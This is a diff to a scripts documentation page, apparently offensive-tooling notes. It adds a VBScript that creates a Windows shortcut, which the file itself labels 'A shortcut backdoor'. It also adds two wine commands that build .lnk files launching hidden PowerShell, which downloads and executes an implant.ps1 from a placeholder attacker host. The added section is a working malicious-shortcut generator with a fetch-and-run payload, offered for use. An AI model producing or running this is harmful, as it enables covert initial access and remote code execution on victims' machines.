@@ -1,5 +1,7 @@
 # Scripts
 
+## PowerShell
+
 ```powershell
 $ErrorActionPreference = "Stop" # Halt on any error
 
@@ -102,6 +104,35 @@ try {
 } catch {
     Write-Host "An error occurred: $_" -ForegroundColor "Red"
 }
+```
+
+### 2.2 - VBScript
+
+```vbscript
+Set ObjectWScript = WScript.CreateObject("WScript.Shell")
+
+' Arguments: target executable, target arguments, shortcut file
+stringTargetPath = WScript.Arguments(0)
+stringTargetArguments = WScript.Arguments(1)
+ShortcutFile = WScript.Arguments(2)
+
+Set objLink = ObjectWScript.CreateShortcut(ShortcutFile)
+
+objLink.TargetPath = stringTargetPath
+objLink.Arguments = stringTargetArguments
+objLink.Description = "A shortcut backdoor"
+objLink.IconLocation = "shell32.dll,21"
+objLink.WindowStyle = 7 ' 1 - Normal, 3 - Maximized, 7 - Minimized
+objLink.WorkingDirectory = "C:\Users\Public"
+objLink.Save
+```
+
+To execute the script with `wine` by generating a shortcut `.lnk` file.
+
+```
+$ wine wscript '//Nologo' '//B' generate_lnk.vbs "C:\Windows\System32\conhost.exe" "--headless powershell.exe -nop -NonI -Nologo -w hidden -c ""IEX ((New-Object Net.WebClient).DownloadString('http[s]://<IP>:<PORT>/implant.ps1'))""" shortcut_file.lnk
+
+$ wine wscript '//Nologo' '//B' generate_lnk.vbs "C:\Windows\System32\cmd.exe" "/c powershell.exe -nop -NonI -Nologo -w hidden -c ""IEX ((New-Object Net.WebClient).DownloadString('http[s]://<IP>:<PORT>/implant.ps1'))""" shortcut_file.lnk
 ```
 
 ---
